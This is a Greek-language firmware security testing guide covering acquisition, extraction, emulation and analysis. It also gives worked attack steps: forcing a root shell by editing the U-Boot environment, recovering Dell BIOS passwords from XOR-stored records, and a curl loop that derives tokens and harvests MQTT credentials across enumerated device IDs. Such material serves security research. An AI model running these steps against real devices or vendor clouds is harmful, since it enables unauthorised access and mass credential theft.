Το Firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των στοιχείων του hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε ζωτικής σημασίας οδηγίες από τη στιγμή που ενεργοποιείται, γεγονός που οδηγεί στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του Firmware είναι ένα κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές του codebase και τις τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και ρυθμιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [LGTM της Semmle](https://lgtm.com/#explore) προσφέρουν δωρεάν στατική ανάλυση, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση Firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Δημιουργία** του από τις παρεχόμενες οδηγίες
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων Firmware
- Απευθείας πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** μέσω τεχνικών man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Παρακολούθηση** αιτημάτων ενημέρωσης στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Λήψη dump** από τον bootloader ή μέσω δικτύου
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, αν αποτύχουν όλα τα άλλα, με χρήση κατάλληλων εργαλείων hardware

### Καταγραφή μόνο μέσω UART: επιβολή root shell μέσω του περιβάλλοντος U-Boot στη flash

Αν αγνοούνται τα δεδομένα RX του UART (εμφανίζονται μόνο logs), μπορείτε και πάλι να επιβάλετε ένα init shell **τροποποιώντας offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump της SPI flash με ένα κλιπ SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό για να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε γι' αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν η εντροπία είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:

### Διαφορική ανάλυση flash και ανακτήσιμα μυστικά αποθηκευμένα με XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά πραγματοποιήστε αρκετές συγκρίσιμες αναγνώσεις flash, αλλάξτε **ακριβώς μία** ρύθμιση, δημιουργήστε ξανά dump ολόκληρου του chip και συγκρίνετε τις θέσεις. Η επανάληψη του πειράματος με ελεγχόμενες τιμές βοηθά να διακρίνετε τη ρύθμιση από τους μετρητές και τα μεταδεδομένα εγγραφής· οι αλλαγές σε νέες θέσεις αντί για επιτόπου υποδεικνύουν αποθήκευση μόνο με προσθήκη ή δομημένη ως αρχείο καταγραφής. Διατηρήστε τις διαγραμμένες/ακυρωμένες καταχωρίσεις, επειδή τα byte του περιεχομένου τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα modules του firmware με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την ευρετηρίαση των κλειδιών και την παραγωγή των κλειδιών, αντί να συμπεράνετε το σχήμα μόνο από τα μοτίβα του ciphertext.<sup>[[10]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο zero padding

Όπως περιγράφεται στην ενότητα [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες μετατοπίσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το zero padding του καλύπτει όλους τους δείκτες ενός επαναλαμβανόμενου XOR key: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτεται κάθε δείκτης του κλειδιού, ανακατασκευάστε το κλειδί από το τέλος του ciphertext και αποκρυπτογραφήστε τα συμπληρωμένα bytes.<sup>[[10]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 bytes.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται ολόκληρο το κλειδί και ο κωδικός χωρίς brute force:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR παράγεται κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, και η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte του σε απλό κείμενο. Αυτό δίνει έως 256 κλειδιά ανά συσκευή, ενώ οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και τις διαγραμμένες εγγραφές με βάση αυτό το byte· μια σύντομη ιστορική εγγραφή μπορεί να leak ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή της οποίας το padding δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό κρυπτοκείμενο επισημαίνεται ως διαγραμμένο αντί να διαγράφεται οριστικά.<sup>[[10]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει το DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα byte και τα byte κλειδιών. Κάντε build από ένα checkout και σαρώστε μια επαληθευμένη flash image ως εξής:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για προσαρμοσμένους parsers, απορρίψτε τα false positives χρησιμοποιώντας τη δομή των εγγραφών, περιορισμούς εκτυπώσιμων χαρακτήρων, ελέγχους για zero-padding, εντροπία κλειδιού και συνέπεια στα σημεία όπου το κλειδί επαναλαμβάνεται κυκλικά. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αλλαγές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και ιεραρχήστε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικό αποτέλεσμα ως ακριβή ανάκτηση.<sup>[[10]](#references)</sup>

Οι επαληθευτές κωδικών πρόσβασης πρέπει να αποθηκεύουν ένα salted, επαναληπτικό μονόδρομο hash αντί για αντιστρέψιμο ciphertext, ενώ τα log-structured stores πρέπει να αφαιρούν με ασφάλεια το παρωχημένο μυστικό υλικό.<sup>[[10]](#references)</sup>

### Λήψη του συστήματος αρχείων

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα πρέπει να έχετε μπορέσει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να απομονώσετε το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για το carving του συστήματος αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί για να κατανοηθεί η δομή του και να εντοπιστούν πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από την εικόνα firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή συμβολοσειρών, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των κατατμήσεων και των συστημάτων αρχείων:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με το `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με τη χρήση του `binwalk -ev <bin>`, μπορεί κανείς συνήθως να εξαγάγει το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται μη αυτόματη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την αποκοπή του:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση filesystem

Αφού εξαχθεί το filesystem, ξεκινά η αναζήτηση για κενά ασφαλείας. Ελέγχονται μη ασφαλή network daemons, hardcoded διαπιστευτήρια, endpoints API, λειτουργίες update server, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο:

- **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανά κενά ασφαλείας
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και κενών ασφαλείας μέσα στο filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που βρίσκονται στο filesystem πρέπει να ελεγχθούν για κενά ασφαλείας. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να γίνουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω URL tokens που προκύπτουν από υπολογισμό

Πολλά IoT hubs λαμβάνουν τις ρυθμίσεις ανά συσκευή από ένα cloud endpoint της μορφής:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID, χρησιμοποιώντας ένα hardcoded μυστικό, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει το cloud config, αποκαλύπτοντας συχνά plaintext διαπιστευτήρια MQTT και topic prefixes.

Πρακτική ροή εργασίας:

1) Εξαγωγή του deviceId από τα boot logs UART

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εκτυπώνουν το μοτίβο URL του cloud config και τη διεύθυνση broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φόρτωσε τα binaries στο Ghidra/radare2 και αναζήτησε τη διαδρομή config ("/pf/") ή χρήση του MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγαγε το token στο Bash και μετέτρεψε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλέξτε cloud config και διαπιστευτήρια MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε τα secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Κατάχρηση plaintext MQTT και αδύναμων topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να κάνετε subscribe σε maintenance topics και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes vendor OUI/product/type ακολουθούμενα από ένα διαδοχικό suffix.
- Μπορείτε να επαναλάβετε candidate IDs, να παράγετε tokens και να λαμβάνετε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική απαρίθμηση.
- Όπου είναι δυνατό, προτιμήστε την εξομοίωση ή τη στατική ανάλυση για την ανάκτηση secrets χωρίς τροποποίηση του υλικού-στόχου.

Η διαδικασία εξομοίωσης firmware επιτρέπει τη **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να συναντήσει προκλήσεις λόγω εξαρτήσεων από το υλικό ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προ-κατασκευασμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να εξομοιώσετε ένα binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τη χρήση του emulator `qemu-arm` για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystems για εξομοίωση

Αν ένα SquashFS superblock είναι αναγνώσιμο, αλλά τα offsets των inode, directory ή fragment table είναι αδύνατα, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο early boot binary και αναπαραγάγετε το γράφημα block device που δημιουργεί: τα embedded συστήματα μπορεί να εκθέτουν ένα τυπικό root partition, αλλά να δημιουργούν το πραγματικό filesystem με αντιστοίχιση `dm-linear` που προσθέτει sectors από άλλο partition. Οι έλεγχοι που βασίζονται μόνο στο superblock μπορεί να πετύχουν, ακόμη κι όταν κάθε επόμενο block μεταδεδομένων βρίσκεται σε λάθος θέση.<sup>[[9]](#references)</sup>

Διατηρήστε ακριβώς την αριθμητική του firmware. Συγκεκριμένα, προσδιορίστε αν τα μήκη είναι σε bytes, sectors των 512 byte ή pages των 4 KiB· αναπαραγάγετε τις ολισθήσεις και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές τέλους που εξαρτώνται από την τράπεζα σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει σε όριο 4 KiB και μετά εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, η θέση της προσαρτημένης έκτασης μπορεί να μετατοπιστεί κατά μερικά kilobytes και να αλλοιώσει όλους τους επόμενους πίνακες SquashFS.<sup>[[9]](#references)</sup>

Μια χρήσιμη διαδικασία επικύρωσης είναι η εξής:<sup>[[9]](#references)</sup>

1. Ανακτήστε από το verifier/init binary τη συσκευή προέλευσης, το sector εκκίνησης και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό παράθυρο γύρω από το προβλεπόμενο όριο και απαιτήστε αρκετές συνεχόμενες έγκυρες δομές μεταδεδομένων, αντί να αποδεχτείτε μόνο ένα εύλογο superblock.
4. Εκτελέστε ένα μη τροποποιημένο `unsquashfs` στην ανακατασκευασμένη εικόνα· η επιτυχής διάσχιση όλων των directories και fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση dm-verity ελεγχόμενη από τον αναλυτή

Όταν ο αναλυτής ελέγχει τον QEMU kernel, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινήσει ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του vendor με ένα μικρό, στατικά συνδεδεμένο init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε lab**, όχι για παραβίαση του dm-verity, της υπογραφής RSA, του Secure Boot ή ενός κλειδιού που είναι σφραγισμένο με TPM.<sup>[[9]](#references)</sup>

Το init αντικατάστασης πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει τη `setsid()`, να συνδέσει το `/dev/console` στα file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να προσαρτήσει το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να εκκινήσει με `execve()` το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποτρέπει την τυχαία αποσύνδεση σημείων mount που ανήκουν στο νέο root.<sup>[[9]](#references)</sup>

Διατηρήστε την τροποποιήσιμη κατάσταση της συσκευής ξεχωριστά από το τροποποιημένο immutable root. Ένα qcow2 overlay μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος virtio δίσκος μόνο για ανάγνωση παρέχει το τροποποιημένο SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Εντοπισμός σφαλμάτων κατάστασης image εκτός σύνδεσης

Εξετάστε την επίμονη κατάσταση εκτός του guest όταν οι αργές εκκινήσεις, τα καταστροφικά scripts εκκίνησης ή η αναξιόπιστη καταγραφή στην κονσόλα δυσκολεύουν τον εντοπισμό της αστοχίας. Μην προσαρτάτε ποτέ ένα overlay που χρησιμοποιεί μια εκτελούμενη VM· κάντε το διαθέσιμο με το `qemu-nbd`, περιορίστε την ανακάλυψη LVM στο προβλεπόμενο partition NBD και απενεργοποιήστε το volume group πριν το αποσυνδέσετε.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονική σήμανση σε έναν σταθερό, εγγράψιμο τόμο και επαληθεύστε τα εκτός σύνδεσης· τα `/dev/kmsg`, οι FIFOs και οι προσωρινές κονσόλες μπορούν να προκαλέσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού διεργασιών. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ επιπέδων προτού αλλάξετε άσχετο κώδικα: `uname -r` έναντι του `/lib/modules/`, τα χαρακτηριστικά ext4 στον δίσκο έναντι της διαμόρφωσης του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει και ακόμη και να φορτώνεται επιτυχώς με `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[9]](#references)</sup>

## Δυναμική ανάλυση στην πράξη

